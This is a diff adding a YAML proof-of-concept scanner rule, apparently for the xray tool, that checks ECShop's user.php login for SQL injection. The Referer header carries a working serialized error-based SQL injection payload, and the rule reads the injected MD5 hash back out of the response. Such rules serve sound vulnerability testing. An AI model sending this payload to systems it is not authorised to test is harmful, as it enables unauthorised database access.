@@ -1,0 +1,15 @@
+name: poc-yaml-ecshop-login-sqli
+set:
+  r1: randomInt(10000, 99999)
+rules:
+  - method: GET
+    path: /user.php?act=login
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:71:"0,1 procedure analyse(updatexml(1,insert(md5({{r1}}),1,1,0x7e),1),1)-- -";s:2:"id";i:1;}
+    follow_redirects: false
+    expression: response.body.bcontains(bytes(substr(md5(string(r1)), 1, 32)))
+detail:
+  author: chalan630
+  links:
+    - https://phishingkittracker.blogspot.com/2019/08/userphp-ecshop-sql-injection-2017.html
